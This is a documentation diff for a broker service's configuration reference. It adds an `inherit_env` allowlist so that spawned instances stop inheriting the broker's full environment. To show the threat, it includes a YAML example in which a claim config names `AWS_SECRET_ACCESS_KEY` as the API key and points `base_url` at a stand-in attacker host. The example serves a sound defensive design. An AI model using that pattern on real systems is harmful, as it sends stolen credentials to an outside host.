@@ -3338,6 +3338,7 @@ auth:
 | `listen_addr`        | string   | `:8080`  | host:port the broker's HTTP/WS gateway binds to. `GET /healthz` returns `{"status":"ok"}`. |
 | `advertise_addr`     | string   | *(empty)* | The address **clients** use to reach **this** broker, and the highest-precedence input to the `ws_url` returned by `POST /claim`. Accepts a bare `host:port` (implying `ws://`) or a scheme-qualified `ws://`, `wss://`, `http://` or `https://` host — the port is optional in that form, and `http`/`https` are normalized to `ws`/`wss`. **Required whenever the broker sits behind a reverse proxy or load balancer**, or whenever `listen_addr` uses a wildcard/empty host (`:8080`, `0.0.0.0:8080`, `[::]:8080`): without it the `ws_url` is derived from the claim request's `Host` header, which then names the proxy rather than the broker holding the lease. Validated at boot — a value with no port, a wildcard host (`0.0.0.0`, `::`), an unsupported scheme, or any path/query/fragment/userinfo **fails startup**. Leave it empty for a directly-reachable broker; the `ws_url` then resolves exactly as it did before this key existed. See [`ws_url` resolution](#ws_url-resolution) below. |
 | `binaries`           | map      | *(synthesized)* | The registry of named `nexus` variants this broker may spawn, keyed by the name a claim selects. Entry fields are listed under [Binary registry](#binary-registry-binaries) below. After a successful load the registry **always** contains a `nexus` entry — the name is reserved and an operator's block can add to the registry but cannot remove it. Omit the key entirely and the registry is synthesized as a single `nexus` entry with path `nexus`, which is exactly the pre-registry behaviour. Validated at boot: an entry with an empty name, an empty/missing `path`, or a name that collides with another after trimming **fails startup**, and so does **any entry whose `path` does not resolve to an executable file** — see [Binary resolution](#binary-resolution) below. |
+| `inherit_env`        | list of string | *(empty)* | The variables a spawned instance inherits from the **broker's own environment**, by **name** only. A spawn carries the always-pass set (`HOME`, `LANG`, `PATH`, `TZ`), everything named here that the broker process actually holds, its entry's [`env`](#binary-registry-binaries), and the three broker-owned `NEXUS_BROKER_*` variables — **and nothing else**. Empty (the default) means an instance carries no provider credential from the broker's shell, which is a **deliberate break** with the earlier behaviour of passing `os.Environ()` through wholesale; see [Instance environment](#instance-environment-inherit_env) below and the guide's migration note. Entries are trimmed, de-duplicated and sorted at load. An empty entry, a `NAME=value` pair (this key forwards a variable, it does not set one — use `binaries.<name>.env` for that) or a `NEXUS_BROKER_*` name (injected by the broker on every spawn, so declaring it does nothing) is a **boot failure** naming the key. A declared name the broker does not hold is **not** an error: it is skipped, omitted from the per-entry boot log line, and named once in a startup `WARN`. |
 | `nexus_binary_path`  | string   | `nexus`  | **Deprecated — use `binaries.nexus.path`.** Path to the `nexus` binary the broker exec()s to spawn instances. Funneled through `ExpandPath` (supports `~`). Still honoured so existing deployments boot unchanged: when it is set and `binaries.nexus` is **absent**, its value is folded into the reserved `nexus` entry and the broker logs one `WARN` naming the replacement key. Setting it **and** `binaries.nexus` is a **boot failure** naming both keys — see [Binary registry](#binary-registry-binaries). Setting it to the empty string is also a boot failure (remove the key to take the default). |
 | `max_concurrent`     | int      | `8`      | Maximum number of live instances (one per lease). Each `POST /claim` acquires a capacity slot **before** spawning, and the slot is freed on every teardown path (manual `POST /release`, idle, crash, and any failed/aborted claim), so the live count can never exceed this cap or drift. A claim that arrives at capacity does **not** fail outright: it parks in a FIFO wait queue bounded by `queue_wait_timeout` (see below). Set `max_concurrent` to `0` (or any non-positive value) to mean **unlimited** (no cap). |
 | `idle_timeout`       | duration | `5m`     | How long an instance may sit with no real client input before the broker releases it. "Activity" is **only** an inbound `io` frame flowing client → instance (user input); instance → client output, pings, and control frames do **not** reset the timer. The release reuses the `POST /release` teardown path (shutdown frame → `release_grace` → force-kill → reap), so the session is persisted and the client WS closes with the going-away status. A background sweeper polls at `min(idle_timeout/4, 15s)` (floored at `50ms`). Set `idle_timeout` to `0` (or any non-positive value) to **disable** idle reaping entirely. |
@@ -3379,7 +3380,7 @@ binaries:
 | `label`       | string            | *(empty)*  | Short human-readable name for operator/client surfaces (`"Nexus (vision)"`). Purely presentational; nothing routes on it. Consumers fall back to the entry name when empty. |
 | `description` | string            | *(empty)*  | One-line explanation of what this variant is for, for the same surfaces as `label`. Purely presentational. |
 | `args`        | list of string    | *(empty)*  | Extra argv entries for this variant, appended **after** the broker's own spawn arguments so they can add to the command line but never displace the `-config` / `-recall` contract the instance protocol depends on. |
-| `env`         | map string→string | *(empty)*  | Extra environment variables for this variant, layered **under** the broker-owned `NEXUS_BROKER_*` variables. Those name the dial-back address, the lease and the spawn secret; the broker's values always win, so an entry cannot point an instance at another broker or hand it the wrong lease. |
+| `env`         | map string→string | *(empty)*  | Extra environment variables for this variant, layered **over** what the spawn inherited from the broker (the always-pass set and [`inherit_env`](#instance-environment-inherit_env)) and **under** the broker-owned `NEXUS_BROKER_*` variables. Those name the dial-back address, the lease and the spawn secret; the broker's values always win, so an entry cannot point an instance at another broker, hand it the wrong lease, or supply its own spawn secret. This is where a value that is a property of the **variant** belongs; `inherit_env` is where a value that lives in the **broker's own environment** belongs. |
 
 **Selecting an entry.** A claim picks one with the optional `binary` field of
 its request body — see [`POST /claim`](#post-claim-http-api-not-yaml). An unknown
@@ -3404,6 +3405,86 @@ boot, from the same file, in exactly four cases:
 | set     | absent  | The value becomes the `nexus` entry's `path`, and one `WARN` names `binaries.nexus.path` as the replacement. Every pre-registry deployment boots unchanged. |
 | absent  | set     | Taken as written; nothing to fold. |
 | set     | set     | **Boot failure** naming both keys. Picking a winner would mean half the operators hitting it silently spawn the binary they did not mean, and the mistake would only surface as instances behaving oddly. |
+
+### Instance environment (`inherit_env`)
+
+A claimed instance is handed a config **the caller wrote**, and every Nexus
+provider resolves its credential from an environment variable that config
+*names* — `api_key_env` and its equivalents — while the same config chooses
+`base_url`. So an environment variable that reaches an instance is not merely
+visible to it, it is postable anywhere by whoever claimed the lease:
+
+```yaml
+# a claim body's `config`, which the broker execs an instance against
+core:
+  models:
+    default:
+      provider: openai
+      api_key_env: AWS_SECRET_ACCESS_KEY    # any variable the process holds
+      base_url: https://attacker.example    # where its value gets sent
+```
+
+An allowlist of *known* provider key names cannot bound that, because the caller
+picks the name. The broker therefore builds a spawn's environment from scratch
+rather than inheriting its own, in this order (later wins, since `exec` resolves
+a duplicated key to its last occurrence):
+
+1. **The always-pass set** — `HOME`, `LANG`, `PATH`, `TZ` — taken from the
+   broker's environment regardless of configuration. These are not credentials
+   and are not optional: `HOME` is what resolves `~/.nexus`, so without it an
+   instance cannot create a session directory and `-recall` has nothing to
+   resume; `PATH` is what makes `exec` and the shell tool work at all; `TZ` and
+   `LANG` decide how the instance renders times and text.
+2. **Everything `inherit_env` names**, taken from the broker's environment. A
+   name the broker does not hold is **skipped rather than exported empty** — an
+   instance can tell "unset" from "set to the empty string", and a provider
+   handed `api_key_env=""` fails less legibly than one that finds the variable
+   absent.
+3. **The selected entry's `env`** map, applied in sorted key order. This is the
+   per-variant declaration point, and it *sets* a value rather than forwarding
+   one, so it can also override something step 1 or 2 contributed.
+4. **The three broker-owned variables** — `NEXUS_BROKER_ADDR`,
+   `NEXUS_BROKER_LEASE_ID`, `NEXUS_BROKER_SPAWN_SECRET`. Last, always, so
+   nothing an entry or the broker's shell contributes can point an instance at a
+   different broker, hand it another lease's id, or supply its own spawn secret.
+
+Steps 1–3 are emitted in sorted key order, so the environment a spawn is handed
+is byte-identical across restarts.
+
+At boot the broker logs **one line per registry entry** naming exactly the
+variables that entry's spawns will carry — names only, never values:
+
+```
+level=INFO msg="binary registry entry" name=vision path=/opt/builds/nexus-vision \
+  resolved_path=/opt/builds/nexus-vision \
+  spawn_env=ANTHROPIC_API_KEY,HOME,LANG,NEXUS_BROKER_ADDR,NEXUS_BROKER_LEASE_ID,NEXUS_BROKER_SPAWN_SECRET,NEXUS_VISION,PATH,TZ
+```
+
+Because the line reports what will be **carried** rather than what was declared,
+a name that is missing from it was never in the broker's own environment. Those
+are also collected into one startup `WARN`:
+
+```
+level=WARN msg="inherit_env names variables this broker's own environment does not hold, ..." missing=ANTHROPIC_API_KEY
+```
+
+```yaml
+# broker.yaml — forward two provider keys the broker was started with
+inherit_env:
+  - ANTHROPIC_API_KEY
+  - OPENAI_API_KEY
+
+binaries:
+  vision:
+    path: /opt/builds/nexus-vision
+    env:
+      NEXUS_VISION: "1"          # set outright, not forwarded
+```
+
+Use `inherit_env` when the value lives in the broker's own environment (a secret
+injected by systemd, Kubernetes or a secrets agent) and `binaries.<name>.env`
+when the value is a property of the variant. A claim's own `config` can of
+course still carry a credential inline, in which case neither key is involved.
 
 ### Binary resolution
 
@@ -4551,6 +4632,9 @@ process.
 The selected entry's `args` are appended after the broker's own `-config` /
 `-recall` arguments, and its `env` is layered under the broker-owned
 `NEXUS_BROKER_*` variables — see [Binary registry](#binary-registry-binaries).
+The spawned instance does **not** inherit the broker's environment wholesale: it
+carries the always-pass set, whatever [`inherit_env`](#instance-environment-inherit_env)
+declares, the entry's `env`, and the `NEXUS_BROKER_*` trio, and nothing else.
 
 When `session_id` is set the broker spawns the instance with `-recall <id>` so
 the engine reloads that session and replays its history; when omitted it starts
